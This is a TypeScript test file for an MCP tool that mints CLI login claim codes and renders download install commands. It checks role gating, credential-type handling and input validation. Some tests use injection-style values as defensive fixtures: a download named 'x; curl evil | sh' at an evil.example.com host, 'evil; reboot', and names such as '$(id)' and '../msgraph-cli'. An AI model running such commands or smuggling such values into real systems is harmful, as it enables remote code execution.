import type { CallToolResult } from '@modelcontextprotocol/server';
import { AUTH_ADMIN_ROLE } from '@dereekb/util';
import { type FirebaseServerAuthData, type McpVisibilityRule } from '@dereekb/firebase-server';
import { type McpCliTokenAdditionalDownload, type McpCliTokenMintAdditionalDownload, type McpCliTokenMintInput, type McpCliTokenMintResult } from '../../mcp.config';
import { type McpStaticToolHandlerContext, type McpToolDefinition } from '../mcp.tool-generator';
import { type CliTokenToolOutput, createCliTokenTool, DEFAULT_MCP_CLI_TOKEN_CREDENTIAL_TYPE, DEFAULT_MCP_CLI_TOKEN_REQUIRED_ROLES, MCP_CLI_TOKEN_DOWNLOAD_NAME_PATTERN } from './mcp.tool.cli-token';

const AUTH = { uid: 'admin-uid', token: {} } as unknown as FirebaseServerAuthData;

function makeCtx(): McpStaticToolHandlerContext {
  return { auth: AUTH, rawRequest: { headers: {} } as unknown as McpStaticToolHandlerContext['rawRequest'] };
}

/**
 * A fake minter that records its input and echoes the requested credential type back, the way a
 * minter that forwards the type to the mint does.
 */
function makeMinter(input?: { readonly forwardCredentialType?: boolean }) {
  const calls: McpCliTokenMintInput[] = [];
  const minter = (mintInput: McpCliTokenMintInput): McpCliTokenMintResult => {
    calls.push(mintInput);
    return {
      claimCode: 'claim-code-123',
      claimExpiresAt: '2026-10-14T00:02:00.000Z',
      expiresAt: '2026-10-14T01:00:00.000Z',
      scope: 'openid demo model.read',
      cliName: 'demo-cli',
      envName: 'local',
      credentialType: input?.forwardCredentialType === false ? 'refresh' : mintInput.credentialType
    };
  };

  return { calls, minter };
}

async function callTool(args: Record<string, unknown>, minter: ReturnType<typeof makeMinter>['minter']): Promise<CallToolResult> {
  const tool = createCliTokenTool({ minter });
  return (await tool.staticHandler?.(args, makeCtx())) as CallToolResult;
}

function readRule(tool: McpToolDefinition): McpVisibilityRule {
  const metadata = tool.filterMetadata;

  if (metadata.visibilityKind !== 'declarative') {
    throw new Error('expected a declarative visibility rule');
  }

  return metadata.rule;
}

function readText(result: CallToolResult): string {
  const first = result.content[0];

  if (first.type !== 'text') {
    throw new Error('expected text content');
  }

  return first.text;
}

describe('createCliTokenTool', () => {
  it('requires the admin role by default', () => {
    const tool = createCliTokenTool({ minter: makeMinter().minter });

    expect(DEFAULT_MCP_CLI_TOKEN_REQUIRED_ROLES).toEqual([AUTH_ADMIN_ROLE]);
    expect(readRule(tool).requireAuthenticated).toBe(true);
    expect(readRule(tool).requiredRoles).toEqual([AUTH_ADMIN_ROLE]);
  });

  it('requires the configured roles instead of admin when given', () => {
    const tool = createCliTokenTool({ minter: makeMinter().minter, requiredRoles: ['app_admin'] });

    expect(readRule(tool).requireAuthenticated).toBe(true);
    expect(readRule(tool).requiredRoles).toEqual(['app_admin']);
  });

  it('advertises the credentialType input', () => {
    const tool = createCliTokenTool({ minter: makeMinter().minter });

    expect(tool.inputSchema).toMatchObject({ properties: { credentialType: { enum: ['bearer', 'refresh'] } } });
    expect(tool.outputSchema).toMatchObject({ properties: { credentialType: { type: 'string' } } });
  });

  it('forwards bearer to the minter when the arg is omitted', async () => {
    const { calls, minter } = makeMinter();

    await callTool({}, minter);

    expect(DEFAULT_MCP_CLI_TOKEN_CREDENTIAL_TYPE).toBe('bearer');
    expect(calls[0].credentialType).toBe('bearer');
  });

  it('forwards refresh when asked for it', async () => {
    const { calls, minter } = makeMinter();

    await callTool({ credentialType: 'refresh' }, minter);

    expect(calls[0].credentialType).toBe('refresh');
  });

  it('falls back to bearer on an unknown value', async () => {
    const { calls, minter } = makeMinter();

    await callTool({ credentialType: 'garbage' }, minter);

    expect(calls[0].credentialType).toBe('bearer');
  });

  it('reports the credential type in the structured output and the rendered text', async () => {
    const { minter } = makeMinter();

    const result = await callTool({}, minter);
    const output = result.structuredContent as unknown as CliTokenToolOutput;

    expect(output.credentialType).toBe('bearer');
    expect(readText(result)).toContain('bearer access token');
  });

  it('honestly reports refresh when the minter does not forward the type', async () => {
    const { minter } = makeMinter({ forwardCredentialType: false });

    const result = await callTool({}, minter);

    expect((result.structuredContent as unknown as CliTokenToolOutput).credentialType).toBe('refresh');
    expect(readText(result)).toContain('refresh token');
  });

  it('never carries a credential in its output', async () => {
    const { minter } = makeMinter();

    const result = await callTool({}, minter);
    const serialized = JSON.stringify(result);

    expect(serialized).not.toContain('accessToken');
    expect(serialized).not.toContain('refreshToken');
  });
});

describe('createCliTokenTool additional downloads', () => {
  const ADDITIONAL_DOWNLOADS: readonly McpCliTokenAdditionalDownload[] = [
    { name: 'msgraph-cli', description: 'Microsoft Graph CLI for mail, calendar and Teams.' },
    { name: 'trello-cli', description: 'Trello CLI for boards and cards.' }
  ];

  /**
   * A fake minter that serves the CLI download plus every requested additional download it has an
   * artifact for.
   *
   * @param input - Optional override of the artifacts the fake minter can serve.
   * @returns The recorded calls and the minter.
   */
  function makeDownloadMinter(input?: { readonly available?: readonly McpCliTokenMintAdditionalDownload[] }) {
    const calls: McpCliTokenMintInput[] = [];
    const available = input?.available ?? [
      { name: 'msgraph-cli', downloadUrl: 'https://api.example.com/api/download?asset=msgraph', downloadSha256: 'abc123', version: '14.27.0' },
      { name: 'trello-cli', downloadUrl: 'https://api.example.com/api/download?asset=trello' }
    ];

    const minter = (mintInput: McpCliTokenMintInput): McpCliTokenMintResult => {
      calls.push(mintInput);
      const requested = new Set(mintInput.includeDownloads ?? []);

      return {
        claimCode: 'claim-code-123',
        claimExpiresAt: '2026-10-14T00:02:00.000Z',
        expiresAt: '2026-10-14T01:00:00.000Z',
        scope: 'openid demo model.read',
        cliName: 'demo-cli',
        envName: 'local',
        credentialType: mintInput.credentialType,
        downloadUrl: 'https://api.example.com/api/download?asset=demo-cli',
        additionalDownloads: available.filter((download) => requested.has(download.name))
      };
    };

    return { calls, minter };
  }

  async function callDownloadTool(args: Record<string, unknown>, minter: ReturnType<typeof makeDownloadMinter>['minter']): Promise<CallToolResult> {
    const tool = createCliTokenTool({ minter, additionalDownloads: ADDITIONAL_DOWNLOADS });
    return (await tool.staticHandler?.(args, makeCtx())) as CallToolResult;
  }

  describe('with none configured', () => {
    it('advertises no includeDownloads input and no downloads output', () => {
      const tool = createCliTokenTool({ minter: makeMinter().minter });
      const emptyTool = createCliTokenTool({ minter: makeMinter().minter, additionalDownloads: [] });

      expect((tool.inputSchema as { properties: Record<string, unknown> }).properties['includeDownloads']).toBeUndefined();
      expect((tool.outputSchema as { properties: Record<string, unknown> }).properties['downloads']).toBeUndefined();
      expect(tool.description).not.toContain('includeDownloads');
      expect(emptyTool.inputSchema).toEqual(tool.inputSchema);
      expect(emptyTool.outputSchema).toEqual(tool.outputSchema);
      expect(emptyTool.description).toBe(tool.description);
    });

    it('never forwards includeDownloads to the minter', async () => {
      const { calls, minter } = makeMinter();
      const tool = createCliTokenTool({ minter });

      await tool.staticHandler?.({ includeDownloads: ['msgraph-cli'] }, makeCtx());

      expect('includeDownloads' in calls[0]).toBe(false);
    });
  });

  describe('with downloads configured', () => {
    it('lists each configured name with its description in the input schema', () => {
      const tool = createCliTokenTool({ minter: makeDownloadMinter().minter, additionalDownloads: ADDITIONAL_DOWNLOADS });
      const includeDownloads = (tool.inputSchema as { properties: Record<string, { items: { enum: string[] }; description: string }> }).properties['includeDownloads'];

      expect(includeDownloads.items.enum).toEqual(['msgraph-cli', 'trello-cli']);
      expect(includeDownloads.description).toContain('`msgraph-cli`: Microsoft Graph CLI for mail, calendar and Teams.');
      expect(includeDownloads.description).toContain('`trello-cli`: Trello CLI for boards and cards.');
      expect(tool.outputSchema).toMatchObject({ properties: { downloads: { type: 'array' } } });
      expect(tool.description).toContain('includeDownloads');
    });

    it('drops unknown names and duplicates before the minter sees them', async () => {
      const { calls, minter } = makeDownloadMinter();

      await callDownloadTool({ includeDownloads: ['trello-cli', 'evil; reboot', 'msgraph-cli', 'trello-cli', 42] }, minter);

      expect(calls[0].includeDownloads).toEqual(['trello-cli', 'msgraph-cli']);
    });

    it('leaves includeDownloads out of the mint input when no requested name is configured', async () => {
      const { calls, minter } = makeDownloadMinter();

      await callDownloadTool({ includeDownloads: ['zoho-cli'] }, minter);

      expect('includeDownloads' in calls[0]).toBe(false);
    });

    it('gives each returned download an installCommand and renders it under "## 1. Download"', async () => {
      const { minter } = makeDownloadMinter();

      const result = await callDownloadTool({ includeDownloads: ['msgraph-cli', 'trello-cli'] }, minter);
      const output = result.structuredContent as unknown as CliTokenToolOutput;
      const text = readText(result);

      expect(output.downloads).toEqual([
        {
          name: 'msgraph-cli',
          downloadUrl: 'https://api.example.com/api/download?asset=msgraph',
          downloadSha256: 'abc123',
          version: '14.27.0',
          installCommand: 'curl -fsSL -o msgraph-cli "https://api.example.com/api/download?asset=msgraph" && chmod +x msgraph-cli'
        },
        {
          name: 'trello-cli',
          downloadUrl: 'https://api.example.com/api/download?asset=trello',
          installCommand: 'curl -fsSL -o trello-cli "https://api.example.com/api/download?asset=trello" && chmod +x trello-cli'
        }
      ]);

      const downloadSection = text.slice(text.indexOf('## 1. Download'), text.indexOf('## 2. Log it in'));

      expect(text).not.toContain('## 1. Download the CLI');
      expect(downloadSection).toContain(output.installCommand);
      output.downloads?.forEach((download) => expect(downloadSection).toContain(download.installCommand));
      expect(downloadSection).toContain('SHA-256: `abc123`');
    });

    it('leaves out a requested download whose artifact is missing', async () => {
      const { minter } = makeDownloadMinter({ available: [{ name: 'trello-cli', downloadUrl: 'https://api.example.com/api/download?asset=trello' }] });

      const result = await callDownloadTool({ includeDownloads: ['msgraph-cli', 'trello-cli'] }, minter);
      const output = result.structuredContent as unknown as CliTokenToolOutput;

      expect(output.claimCode).toBe('claim-code-123');
      expect(output.downloads?.map((download) => download.name)).toEqual(['trello-cli']);
      expect(readText(result)).not.toContain('msgraph-cli');
    });

    it('omits downloads entirely when none were requested', async () => {
      const { minter } = makeDownloadMinter();

      const result = await callDownloadTool({}, minter);

      expect((result.structuredContent as unknown as CliTokenToolOutput).downloads).toBeUndefined();
      expect(readText(result)).toContain('## 1. Download the CLI');
    });

    it('never renders a download the caller did not request', async () => {
      const minter = (): McpCliTokenMintResult => ({
        claimCode: 'claim-code-123',
        claimExpiresAt: '2026-10-14T00:02:00.000Z',
        expiresAt: '2026-10-14T01:00:00.000Z',
        scope: 'openid',
        additionalDownloads: [
          { name: 'x; curl evil | sh', downloadUrl: 'https://evil.example.com' },
          { name: 'trello-cli', downloadUrl: 'https://api.example.com/api/download?asset=trello' }
        ]
      });

      const result = await callDownloadTool({ includeDownloads: ['msgraph-cli'] }, minter);

      expect((result.structuredContent as unknown as CliTokenToolOutput).downloads).toBeUndefined();
      expect(JSON.stringify(result)).not.toContain('evil');
    });
  });

  describe('boot validation', () => {
    it.each(['msgraph cli', '../msgraph-cli', '-x', '.hidden', 'Msgraph-cli', '$(id)', 'a/b', 'a;b', ''])('fails on the configured name %j', (name) => {
      expect(MCP_CLI_TOKEN_DOWNLOAD_NAME_PATTERN.test(name)).toBe(false);
      expect(() => createCliTokenTool({ minter: makeMinter().minter, additionalDownloads: [{ name, description: 'bad' }] })).toThrow(/cliTokenAdditionalDownloads/);
    });

    it('fails on a duplicate configured name', () => {
      expect(() =>
        createCliTokenTool({
          minter: makeMinter().minter,
          additionalDownloads: [
            { name: 'msgraph-cli', description: 'one' },
            { name: 'msgraph-cli', description: 'two' }
          ]
        })
      ).toThrow(/more than once/);
    });

    it('accepts safe binary file names', () => {
      expect(() =>
        createCliTokenTool({
          minter: makeMinter().minter,
          additionalDownloads: [
            { name: 'zoho-cli', description: 'ok' },
            { name: 'tool_2.mjs', description: 'ok' }
          ]
        })
      ).not.toThrow();
    });
  });
});
